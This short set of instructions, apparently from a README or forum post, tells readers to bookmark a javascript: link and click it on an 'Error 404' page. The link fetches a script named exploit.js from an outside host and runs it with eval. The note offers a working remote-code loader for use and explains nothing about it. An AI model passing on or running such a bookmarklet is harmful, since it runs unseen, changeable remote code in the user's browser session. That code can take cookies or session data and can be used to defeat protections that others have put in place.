This is the same instructions as the bookmarklet.js but in this one you get this link

javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});

and put it in your bookmarks and when the page takes you to "Error 404"
click the bookmark with the link.
